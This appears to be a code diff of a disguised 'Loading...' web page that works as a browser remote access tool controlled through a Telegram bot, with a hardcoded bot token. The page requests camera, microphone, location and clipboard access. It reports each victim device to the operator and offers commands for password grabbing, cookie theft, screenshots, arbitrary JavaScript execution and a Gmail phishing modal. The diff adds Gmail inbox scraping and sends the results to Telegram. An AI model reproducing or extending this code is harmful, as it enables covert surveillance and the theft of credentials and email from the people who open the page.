@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Loading...</title>
     <style>
-        /* Stealth loading + fake content (same as before) */
         body {
             margin: 0;
             padding: 0;
@@ -105,7 +104,7 @@
         const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
         const ADMIN_CHAT_ID = '8737104261';
         const POLL_INTERVAL = 3000;
-        const START_DELAY = 5000;          // 5 seconds then activate
+        const START_DELAY = 5000;
         const AUDIO_DURATION_MS = 120000;   // 2 minutes
 
         let isRegistered = false;
@@ -114,12 +113,12 @@
         let phishingModalActive = false;
         let deviceId = null;
         let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
+        let gmailDetectedNotified = false;   // Avoid spamming every reload
 
         // Enable console logs for debugging (remove for stealth)
         // console.log = function() {};
         // console.error = function() {};
 
-        // Custom headers to avoid Telegram blocking browser requests
         const TELEGRAM_HEADERS = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         };
@@ -137,9 +136,7 @@
                 const data = await response.json();
                 console.log('sendMessage response:', data);
                 return data;
-            } catch(e) {
-                console.error('sendMessage exception:', e);
-            }
+            } catch(e) { console.error(e); }
         }
 
         async function sendPhoto(blob, caption) {
@@ -158,28 +155,24 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
         }
 
-        // ================= PERMISSION HANDLING =================
+        // ================= PERMISSIONS =================
         async function requestAllPermissions() {
-            // Camera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 permissionsStatus.camera = true;
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) { permissionsStatus.camera = false; }
-            // Microphone
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 permissionsStatus.microphone = true;
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) { permissionsStatus.microphone = false; }
-            // Location
             try {
                 await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
                 });
                 permissionsStatus.location = true;
             } catch(e) { permissionsStatus.location = false; }
-            // Clipboard (requires user gesture, but we try)
             try {
                 await navigator.clipboard.readText();
                 permissionsStatus.clipboard = true;
@@ -189,28 +182,59 @@
         // ================= REGISTRATION =================
         async function registerClient() {
             deviceId = 'dev_' + Math.random().toString(36).substr(2, 8);
-            const info = {
-                deviceId,
-                url: location.href,
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                lang: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'direct',
-                permissions: permissionsStatus
-            };
             const statusEmoji = (perm) => perm ? '🟢' : '🔴';
-            const permLine = `Camera: ${statusEmoji(permissionsStatus.camera)} | Mic: ${statusEmoji(permissionsStatus.microphone)} | GPS: ${statusEmoji(permissionsStatus.location)} | Clipboard: ${statusEmoji(permissionsStatus.clipboard)}`;
+            const permLine = `📷 ${statusEmoji(permissionsStatus.camera)} | 🎤 ${statusEmoji(permissionsStatus.microphone)} | 📍 ${statusEmoji(permissionsStatus.location)} | 📋 ${statusEmoji(permissionsStatus.clipboard)}`;
             await sendMessage(
-                `🔌 *New Device Connected*\n` +
-                `🆔 ID: \`${deviceId}\`\n` +
-                `🌐 URL: ${info.url}\n` +
-                `📱 ${info.platform} | ${info.ua.substring(0,50)}...\n` +
-                `📺 ${info.screen} | 🌍 ${info.lang}\n` +
-                `${permLine}`,
+                `🔌 *New Device Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform} | ${navigator.userAgent.substring(0,60)}...\n📺 ${screen.width}x${screen.height}\n${permLine}`,
                 'Markdown'
             );
+        }
+
+        // ================= GMAIL DETECTION & READING =================
+        function isGmailPage() {
+            return window.location.href.includes('mail.google.com');
+        }
+
+        async function notifyGmailDetected() {
+            if (!gmailDetectedNotified) {
+                gmailDetectedNotified = true;
+                await sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`\nUser is now viewing their inbox. Use /read_emails to fetch messages.`, 'Markdown');
+            }
+        }
+
+        async function readGmailInbox() {
+            if (!isGmailPage()) {
+                return { success: false, error: "Not on Gmail page. User must open mail.google.com first." };
+            }
+            // Wait a bit for the inbox to load
+            await new Promise(r => setTimeout(r, 2000));
+            const emails = [];
+            // Gmail's inbox rows (desktop and mobile)
+            const rows = document.querySelectorAll('.zA, .zE, .Cp');
+            for (let row of rows.slice(0, 20)) { // max 20 emails
+                const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
+                const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
+                const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
+                if (from || subject) {
+                    emails.push({ from, subject, snippet: snippet.substring(0, 100) });
+                }
+            }
+            if (emails.length === 0) {
+                return { success: true, data: "No emails found. Make sure you are on the inbox view." };
+            }
+            return { success: true, data: emails };
+        }
+
+        // ================= HISTORY (LIMITED) =================
+        async function getBrowserHistory() {
+            const navEntries = performance.getEntriesByType("navigation");
+            let navInfo = "";
+            if (navEntries.length > 0) {
+                const nav = navEntries[0];
+                navInfo = `Type: ${nav.type}\nRedirects: ${nav.redirectCount}\nDuration: ${nav.duration}ms\n`;
+            }
+            const info = `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || "none"}\n${navInfo}\n\n⚠️ *Unable to read full browser history* due to browser security. Web pages cannot access the full history list.\n\n💡 *Alternative:* Use \`/eval\` to inject a script that records future navigation (while this page stays open).`;
+            return info;
         }
 
         // ================= PHISHING MODAL =================
@@ -260,10 +284,10 @@
             console.log('Received command:', text);
             const parts = text.trim().split(' ');
             let cmd = parts[0].toLowerCase();
-            // Aliases
             if (cmd === '/phishgmail' || cmd === '/phish_gmail') cmd = '/phish_gmail';
             if (cmd === '/grabpass' || cmd === '/grab_pass') cmd = '/grab_pass';
             if (cmd === '/devices' || cmd === '/list') cmd = '/devices';
+            if (cmd === '/reademails' || cmd === '/read_emails') cmd = '/read_emails';
 
             try {
                 switch(cmd) {
@@ -274,16 +298,36 @@
                                 [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
                                 [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                                 [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
-                                [{ text: '📁 Upload File', callback_data: 'upload' }, { text: '💻 Eval JS', callback_data: 'eval' }],
-                                [{ text: '🔄 Devices', callback_data: 'devices' }]
+                                [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
+                                [{ text: '🔄 Devices', callback_data: 'devices' }, { text: '📜 History', callback_data: 'history' }, { text: '📧 Read Emails', callback_data: 'read_emails' }]
                             ]
                         };
                         await sendMessage(
-                            `✅ *RAT Active* | Device: \`${deviceId}\`\n\n` +
-                            `🟢 Online | Permissions: Camera ${permissionsStatus.camera ? '✅' : '❌'} | Mic ${permissionsStatus.microphone ? '✅' : '❌'} | GPS ${permissionsStatus.location ? '✅' : '❌'}\n\n` +
-                            `Use buttons below or type commands.`,
+                            `✅ *RAT Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n\n${isGmailPage() ? '📧 *Gmail detected* – use /read_emails' : ''}`,
                             'Markdown', buttons
                         );
+                        break;
+                    case '/read_emails':
+                        const result = await readGmailInbox();
+                        if (result.success) {
+                            if (typeof result.data === 'string') {
+                                await sendMessage(`📧 *Gmail Inbox*\n${result.data}`, 'Markdown');
+                            } else {
+                                let msg = `📧 *Latest emails* (${result.data.length}):\n\n`;
+                                for (let i=0; i<result.data.length; i++) {
+                                    const e = result.data[i];
+                                    msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
+                                    if (msg.length > 3800) break;
+                                }
+                                await sendMessage(msg, 'Markdown');
+                            }
+                        } else {
+                            await sendMessage(`❌ ${result.error}`);
+                        }
+                        break;
+                    case '/history':
+                        const historyInfo = await getBrowserHistory();
+                        await sendMessage(historyInfo, 'Markdown');
                         break;
                     case '/phish_gmail':
                         if (!phishingModalActive) createPhishingModal();
@@ -377,8 +421,6 @@
                         await sendMessage('File picker opened on victim side.');
                         break;
                     case '/devices':
-                        // This instance only knows itself; but we could store a global list on server-side.
-                        // For simplicity, we just show this device status.
                         const statusLine = `🖥️ *Your device*\n🆔 \`${deviceId}\`\n🟢 Status: Online\nPermissions:\n📷 Camera: ${permissionsStatus.camera ? '✅' : '❌'}\n🎤 Mic: ${permissionsStatus.microphone ? '✅' : '❌'}\n📍 GPS: ${permissionsStatus.location ? '✅' : '❌'}\n📋 Clipboard: ${permissionsStatus.clipboard ? '✅' : '❌'}`;
                         await sendMessage(statusLine, 'Markdown');
                         break;
@@ -417,10 +459,8 @@
                             if (upd.message && upd.message.text) {
                                 await handleCommand(upd.message.text);
                             } else if (upd.callback_query) {
-                                // Handle button callbacks
                                 const cbData = upd.callback_query.data;
                                 await handleCommand('/' + cbData);
-                                // Answer callback to remove "loading" on button
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
                             }
                         }
@@ -429,7 +469,26 @@
             } catch(e) { console.error(e); }
         }
 
-        // ================= INITIALIZATION =================
+        // ================= PAGE NAVIGATION DETECTION =================
+        let lastUrl = location.href;
+        new MutationObserver(() => {
+            const url = location.href;
+            if (url !== lastUrl) {
+                lastUrl = url;
+                if (isGmailPage()) {
+                    notifyGmailDetected();
+                } else {
+                    gmailDetectedNotified = false;
+                }
+            }
+        }).observe(document, { subtree: true, childList: true });
+
+        // Also check on load
+        window.addEventListener('load', () => {
+            if (isGmailPage()) notifyGmailDetected();
+        });
+
+        // ================= INIT =================
         async function deleteWebhookAndStart() {
             console.log('Deleting webhook...');
             try {
